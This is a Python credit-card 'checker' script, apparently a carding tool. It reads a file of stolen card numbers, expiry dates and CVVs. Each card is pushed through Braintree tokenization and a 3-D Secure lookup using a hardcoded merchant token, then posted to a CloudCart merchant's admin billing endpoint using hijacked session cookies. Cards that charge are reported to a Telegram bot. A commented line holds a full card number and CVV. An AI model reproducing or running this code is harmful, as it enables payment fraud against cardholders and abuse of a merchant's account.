import requests
import pyfiglet,os
file=open(input('Enter Name File Card :'),"+r")
tok=input('Token Bot Telegram :')
ik=input('ID Telegram :')
os.system('clear')
Z =  '\033[1;31m' 
F = '\033[2;32m' 
B = '\033[2;36m'
X = '\033[1;33m' 
C = '\033[2;35m'
logo = pyfiglet.figlet_format('            MO3GZA ')
print(Z+logo)
k=("----+----+-----+------+-----+") 
print(X+k)
lo=("Tele:@MO3GZA_404\nCh Tele:@THE_S9")
print(C+lo)
i=("----+----+-----+------+-----+")
print(B+i)
o=("#====================================##============================")
print(F+o)
start_num = 0
for P in file.readlines():
		start_num += 1
		n = P.split('|')[0]
		mm=P.split('|')[1]
		yy=P.split('|')[2][-2:]
		cvc=P.split('|')[3].replace('\n', '')
		P=P.replace('\n', '')
		headers = {
		    'authority': 'payments.braintree-api.com',
		    'accept': '*/*',
		    'accept-language': 'en-US,en;q=0.9,ar-EG;q=0.8,ar-AE;q=0.7,ar;q=0.6',
		    'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE2OTk3MjYzOTAsImp0aSI6IjkxMzE2YmQyLTcyNDItNDU2ZS1hNDgwLWYwN2Q0Y2Y4YWIwOSIsInN1YiI6Imt2aHl0Z2R4Y2drM3ZuODMiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6Imt2aHl0Z2R4Y2drM3ZuODMiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0Il0sIm9wdGlvbnMiOnsiY3VzdG9tZXJfaWQiOiI2NGQzZDJhMzc0MWVmIiwibWVyY2hhbnRfYWNjb3VudF9pZCI6ImNsb3VkY2FydEVVUiJ9fQ.WgvAOP2M8uHINo9SORp2ezp7vAOi--ToEsyLxR_0vwciENS_78mgNv4OPnu1149Za6Vt15pHK5HS3IwYiACVMA?customer_id=',
		    'braintree-version': '2018-05-10',
		    'cache-control': 'no-cache',
		    'content-type': 'application/json',
		    'origin': 'https://assets.braintreegateway.com',
		    'pragma': 'no-cache',
		    'referer': 'https://assets.braintreegateway.com/',
		    'save-data': 'on',
		    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
		    'sec-ch-ua-mobile': '?1',
		    'sec-ch-ua-platform': '"Android"',
		    'sec-fetch-dest': 'empty',
		    'sec-fetch-mode': 'cors',
		    'sec-fetch-site': 'cross-site',
		    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
		}
		
		json_data = {
		    'clientSdkMetadata': {
		        'source': 'client',
		        'integration': 'dropin2',
		        'sessionId': '87960f30-f3d7-48de-b790-39ea9a696a9f',
		    },
		    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
		    'variables': {
		        'input': {
		            'creditCard': {
		                'number': n,
		                'expirationMonth': mm,
		                'expirationYear': yy,
		                'cvv': cvc,
		            },
		            'options': {
		                'validate': False,
		            },
		        },
		    },
		    'operationName': 'TokenizeCreditCard',
		}
		
		response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
		id=(response.json()['data']['tokenizeCreditCard']['token'])
		import requests
		
		headers = {
		    'authority': 'api.braintreegateway.com',
		    'accept': '*/*',
		    'accept-language': 'en-US,en;q=0.9,ar-EG;q=0.8,ar-AE;q=0.7,ar;q=0.6',
		    'cache-control': 'no-cache',
		    'content-type': 'application/json',
		    'origin': 'https://funds.cloudcart.net',
		    'pragma': 'no-cache',
		    'referer': 'https://funds.cloudcart.net/',
		    'save-data': 'on',
		    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
		    'sec-ch-ua-mobile': '?1',
		    'sec-ch-ua-platform': '"Android"',
		    'sec-fetch-dest': 'empty',
		    'sec-fetch-mode': 'cors',
		    'sec-fetch-site': 'cross-site',
		    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
		}
		
		json_data = {
		    'amount': '1.00',
		    'additionalInfo': {
		        'acsWindowSize': '03',
		    },
		    'bin': '532614',
		    'dfReferenceId': '1_31471fa5-0ab2-4f0a-9b1b-383babb99df3',
		    'clientMetadata': {
		        'requestedThreeDSecureVersion': '2',
		        'sdkVersion': 'web/3.94.0',
		        'cardinalDeviceDataCollectionTimeElapsed': 1321,
		        'issuerDeviceDataCollectionTimeElapsed': 6626,
		        'issuerDeviceDataCollectionResult': True,
		    },
		    'authorizationFingerprint': 'eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE2OTk3MjYzOTAsImp0aSI6IjkxMzE2YmQyLTcyNDItNDU2ZS1hNDgwLWYwN2Q0Y2Y4YWIwOSIsInN1YiI6Imt2aHl0Z2R4Y2drM3ZuODMiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6Imt2aHl0Z2R4Y2drM3ZuODMiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0Il0sIm9wdGlvbnMiOnsiY3VzdG9tZXJfaWQiOiI2NGQzZDJhMzc0MWVmIiwibWVyY2hhbnRfYWNjb3VudF9pZCI6ImNsb3VkY2FydEVVUiJ9fQ.WgvAOP2M8uHINo9SORp2ezp7vAOi--ToEsyLxR_0vwciENS_78mgNv4OPnu1149Za6Vt15pHK5HS3IwYiACVMA?customer_id=',
		    'braintreeLibraryVersion': 'braintree/web/3.94.0',
		    '_meta': {
		        'merchantAppId': 'funds.cloudcart.net',
		        'platform': 'web',
		        'sdkVersion': '3.94.0',
		        'source': 'client',
		        'integration': 'custom',
		        'integrationType': 'custom',
		        'sessionId': '87960f30-f3d7-48de-b790-39ea9a696a9f',
		    },
		}
		
		response = requests.post(
		    f'https://api.braintreegateway.com/merchants/kvhytgdxcgk3vn83/client_api/v1/payment_methods/{id}/three_d_secure/lookup',
		    headers=headers,
		    json=json_data,
		)
		id=(response.json()['paymentMethod']['nonce'])
		import requests
		
		cookies = {
		    'mautic_session_id': 'f29l8b8zhrfu9fbbdsruxko',
		    'mtc_sid': 'f29l8b8zhrfu9fbbdsruxko',
		    'mtc_id': '5839683',
		    'f29l8b8zhrfu9fbbdsruxko': '5839683',
		    '_ym_uid': '1691603833395487328',
		    '_ym_d': '1691603833',
		    'uuid': '64d3d61e766f759a94094cb6',
		    '_ccases': 'eyJpdiI6Imd0Z0RaTEpEN1R1VW4xSllzQjJNQmc9PSIsInZhbHVlIjoiMjBvZWtGNHhvNFwvc1BCNnRROCtsS3JKTFgwS2d4T1o4OG14Z0M3RTM2cFwvZnlYNUJpMWdSNHRWU1BwN056aHFlYUVrcG9SRU5MK3lOb2piTWNyV25ndz09IiwibWFjIjoiOTZiZDY1ZWU3YmVjOGZkODFhY2RlODZjZWEwOGM0YTk2OGNiYjg2M2UyZGY0NmZkNTYwZGQxYzFmYTQ5N2Q1NyJ9',
		    '_ga_ETPFBCF6ZD': 'GS1.1.1696133075.14.0.1696133075.60.0.0',
		    '_ga': 'GA1.2.918745756.1691603581',
		    'AMP_MKTG_93a8c6ca15': 'JTdCJTIycmVmZXJyZXIlMjIlM0ElMjJodHRwcyUzQSUyRiUyRmNsb3VkY2FydC5jb20lMkYlMjIlMkMlMjJyZWZlcnJpbmdfZG9tYWluJTIyJTNBJTIyY2xvdWRjYXJ0LmNvbSUyMiU3RA==',
		    'AMP_93a8c6ca15': 'JTdCJTIyZGV2aWNlSWQlMjIlM0ElMjIzNjY4NGU4My04ODc4LTQ2NDgtYmVkMy0xMjJkNDJjM2FhYTIlMjIlMkMlMjJ1c2VySWQlMjIlM0E0MDA3MCUyQyUyMnNlc3Npb25JZCUyMiUzQTE2OTg5NTU5ODExMzAlMkMlMjJvcHRPdXQlMjIlM0FmYWxzZSUyQyUyMmxhc3RFdmVudFRpbWUlMjIlM0ExNjk4OTU1OTgxMTUzJTJDJTIybGFzdEV2ZW50SWQlMjIlM0E0NSU3RA==',
		    '_gcl_au': '1.1.69401802.1699466344',
		    'XSRF-TOKEN': 'eyJpdiI6ImxcL1wvMlJOYURZMHVTOWJ5ZjlHY3lWdz09IiwidmFsdWUiOiJmbXZzaklFemZxSjU1eG1wU1dTbEZURkFxUWkzMHdvSDBxMjlxTVZvNjB4cXpzTlwvVmJOUHlJd0J3aW1DNW4zVCIsIm1hYyI6ImU2ODZiYTg3MzFkYTdjZDkwZWQ5NDQ0OWVlM2ZkMmE2OGMzMWNhZjQ4MTRkY2MzZmIzMTAwNTllMGQ3MjQwZmEifQ%3D%3D',
		    '_ym_isad': '2',
		    '_gid': 'GA1.2.904038476.1699639407',
		    '_ym_visorc': 'w',
		    '_ga_36YJJNQXRX': 'GS1.2.1699639407.20.1.1699639873.60.0.0',
		    '_ccs': 'eyJpdiI6IjdZclpLZmZQblNUMXRmRU4reUZcL1pRPT0iLCJ2YWx1ZSI6IlJ1dFFYVU1yV3pVMVlPZWRqSVcwU3lJWXZNZDhhSk5pYTFVZzBJUHhhd05GbEFPT2JwWFpzaE5qN2pROHhxaEgiLCJtYWMiOiJjM2JjZjdjNDZkYWNlY2JiZTgxZmFlMjkwZTk0MzgzYWJlMjU3YWJlMzI0Zjg3ZDRkOTc0YTJhZTgwNzViZjVkIn0%3D',
		}
		
		headers = {
		    'authority': 'funds.cloudcart.net',
		    'accept': 'application/json, text/javascript, */*; q=0.01',
		    'accept-language': 'en-US,en;q=0.9,ar-EG;q=0.8,ar-AE;q=0.7,ar;q=0.6',
		    'cache-control': 'no-cache',
		    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
		    # 'cookie': 'mautic_session_id=f29l8b8zhrfu9fbbdsruxko; mtc_sid=f29l8b8zhrfu9fbbdsruxko; mtc_id=5839683; f29l8b8zhrfu9fbbdsruxko=5839683; _ym_uid=1691603833395487328; _ym_d=1691603833; uuid=64d3d61e766f759a94094cb6; _ccases=eyJpdiI6Imd0Z0RaTEpEN1R1VW4xSllzQjJNQmc9PSIsInZhbHVlIjoiMjBvZWtGNHhvNFwvc1BCNnRROCtsS3JKTFgwS2d4T1o4OG14Z0M3RTM2cFwvZnlYNUJpMWdSNHRWU1BwN056aHFlYUVrcG9SRU5MK3lOb2piTWNyV25ndz09IiwibWFjIjoiOTZiZDY1ZWU3YmVjOGZkODFhY2RlODZjZWEwOGM0YTk2OGNiYjg2M2UyZGY0NmZkNTYwZGQxYzFmYTQ5N2Q1NyJ9; _ga_ETPFBCF6ZD=GS1.1.1696133075.14.0.1696133075.60.0.0; _ga=GA1.2.918745756.1691603581; AMP_MKTG_93a8c6ca15=JTdCJTIycmVmZXJyZXIlMjIlM0ElMjJodHRwcyUzQSUyRiUyRmNsb3VkY2FydC5jb20lMkYlMjIlMkMlMjJyZWZlcnJpbmdfZG9tYWluJTIyJTNBJTIyY2xvdWRjYXJ0LmNvbSUyMiU3RA==; AMP_93a8c6ca15=JTdCJTIyZGV2aWNlSWQlMjIlM0ElMjIzNjY4NGU4My04ODc4LTQ2NDgtYmVkMy0xMjJkNDJjM2FhYTIlMjIlMkMlMjJ1c2VySWQlMjIlM0E0MDA3MCUyQyUyMnNlc3Npb25JZCUyMiUzQTE2OTg5NTU5ODExMzAlMkMlMjJvcHRPdXQlMjIlM0FmYWxzZSUyQyUyMmxhc3RFdmVudFRpbWUlMjIlM0ExNjk4OTU1OTgxMTUzJTJDJTIybGFzdEV2ZW50SWQlMjIlM0E0NSU3RA==; _gcl_au=1.1.69401802.1699466344; XSRF-TOKEN=eyJpdiI6ImxcL1wvMlJOYURZMHVTOWJ5ZjlHY3lWdz09IiwidmFsdWUiOiJmbXZzaklFemZxSjU1eG1wU1dTbEZURkFxUWkzMHdvSDBxMjlxTVZvNjB4cXpzTlwvVmJOUHlJd0J3aW1DNW4zVCIsIm1hYyI6ImU2ODZiYTg3MzFkYTdjZDkwZWQ5NDQ0OWVlM2ZkMmE2OGMzMWNhZjQ4MTRkY2MzZmIzMTAwNTllMGQ3MjQwZmEifQ%3D%3D; _ym_isad=2; _gid=GA1.2.904038476.1699639407; _ym_visorc=w; _ga_36YJJNQXRX=GS1.2.1699639407.20.1.1699639873.60.0.0; _ccs=eyJpdiI6IjdZclpLZmZQblNUMXRmRU4reUZcL1pRPT0iLCJ2YWx1ZSI6IlJ1dFFYVU1yV3pVMVlPZWRqSVcwU3lJWXZNZDhhSk5pYTFVZzBJUHhhd05GbEFPT2JwWFpzaE5qN2pROHhxaEgiLCJtYWMiOiJjM2JjZjdjNDZkYWNlY2JiZTgxZmFlMjkwZTk0MzgzYWJlMjU3YWJlMzI0Zjg3ZDRkOTc0YTJhZTgwNzViZjVkIn0%3D',
		    'origin': 'https://funds.cloudcart.net',
		    'pragma': 'no-cache',
		    'referer': 'https://funds.cloudcart.net/admin/checkout',
		    'save-data': 'on',
		    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
		    'sec-ch-ua-mobile': '?1',
		    'sec-ch-ua-platform': '"Android"',
		    'sec-fetch-dest': 'empty',
		    'sec-fetch-mode': 'cors',
		    'sec-fetch-site': 'same-origin',
		    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
		    'x-requested-with': 'XMLHttpRequest',
		    'x-xsrf-token': 'eyJpdiI6ImxcL1wvMlJOYURZMHVTOWJ5ZjlHY3lWdz09IiwidmFsdWUiOiJmbXZzaklFemZxSjU1eG1wU1dTbEZURkFxUWkzMHdvSDBxMjlxTVZvNjB4cXpzTlwvVmJOUHlJd0J3aW1DNW4zVCIsIm1hYyI6ImU2ODZiYTg3MzFkYTdjZDkwZWQ5NDQ0OWVlM2ZkMmE2OGMzMWNhZjQ4MTRkY2MzZmIzMTAwNTllMGQ3MjQwZmEifQ==',
		}
		
		data = {
		    '_token': '8mNXr5FlzVqDgQgkCGOK4JVIvjzOXXdKPujLlbDU',
		    'payment_method_nonce': id,
		}
		
		response = requests.post('https://funds.cloudcart.net/admin/billing/card', cookies=cookies, headers=headers, data=data)
		ii=response.json()['msg']
		if 'Funds' in ii:
			print(F+P,ii)
			requests.post(f'https://api.telegram.org/bot{tok}/sendMessage?chat_id={id}&text={P} Not enough balance ❎')
		elif 'Successfully' in ii:
			print(F+P,ii)
			requests.post(f'https://api.telegram.org/bot{tok}/sendMessage?chat_id={ik}&text={P} Charge ✅')
		else:
			print(Z+P,ii)
		
		# Note: json_data will not be serialized by requests
		# exactly as it was in the original request.
		#data = '{"amount":"1.00","additionalInfo":{"acsWindowSize":"03"},"bin":"532614","dfReferenceId":"1_31471fa5-0ab2-4f0a-9b1b-383babb99df3","clientMetadata":{"requestedThreeDSecureVersion":"2","sdkVersion":"web/3.94.0","cardinalDeviceDataCollectionTimeElapsed":1321,"issuerDeviceDataCollectionTimeElapsed":6626,"issuerDeviceDataCollectionResult":true},"authorizationFingerprint":"eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE2OTk3MjYzOTAsImp0aSI6IjkxMzE2YmQyLTcyNDItNDU2ZS1hNDgwLWYwN2Q0Y2Y4YWIwOSIsInN1YiI6Imt2aHl0Z2R4Y2drM3ZuODMiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6Imt2aHl0Z2R4Y2drM3ZuODMiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0Il0sIm9wdGlvbnMiOnsiY3VzdG9tZXJfaWQiOiI2NGQzZDJhMzc0MWVmIiwibWVyY2hhbnRfYWNjb3VudF9pZCI6ImNsb3VkY2FydEVVUiJ9fQ.WgvAOP2M8uHINo9SORp2ezp7vAOi--ToEsyLxR_0vwciENS_78mgNv4OPnu1149Za6Vt15pHK5HS3IwYiACVMA?customer_id=","braintreeLibraryVersion":"braintree/web/3.94.0","_meta":{"merchantAppId":"funds.cloudcart.net","platform":"web","sdkVersion":"3.94.0","source":"client","integration":"custom","integrationType":"custom","sessionId":"87960f30-f3d7-48de-b790-39ea9a696a9f"}}'
		#response = requests.post(
		#    'https://api.braintreegateway.com/merchants/kvhytgdxcgk3vn83/client_api/v1/payment_methods/tokencc_bh_vsjvvn_g79g3z_dp2bmy_6yqz83_bd4/three_d_secure/lookup',
		#    headers=headers,
		#    data=data,
		#)
		# Note: json_data will not be serialized by requests
		# exactly as it was in the original request.
		#data = '{"clientSdkMetadata":{"source":"client","integration":"dropin2","sessionId":"87960f30-f3d7-48de-b790-39ea9a696a9f"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"5326146207854610","expirationMonth":"08","expirationYear":"2025","cvv":"888"},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}'
		#response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, data=data)